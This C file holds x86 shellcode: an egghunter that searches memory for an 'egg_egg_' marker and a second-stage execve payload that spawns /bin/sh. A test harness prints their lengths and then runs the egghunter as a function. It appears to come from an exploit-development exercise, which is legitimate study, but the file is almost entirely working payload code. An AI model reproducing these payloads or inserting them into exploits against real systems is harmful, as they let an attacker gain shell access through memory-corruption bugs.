
char egghunter[]= \
"\x58\x81\x38\x65\x67\x67\x5f\x75\x0b\x81\x78\x04\x65\x67\x67\x5f\x75\x02\xeb\x03\x40\xeb\xea\x83\xc0\x08\xff\xe0";

char second_stage[] = \
"egg_" //egg1
"egg_" //egg2
"\x31\xc0\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
//shellcode above after "egg_","egg_" is the execve-shellcode

int main(){
     printf("Length of Egghunter-Shellcode:  %d\n", strlen(egghunter));
     printf("Length of the second stage Shellcode:  %d\n", strlen(second_stage));
     (*(void  (*)()) egghunter)();
     return 0;
}




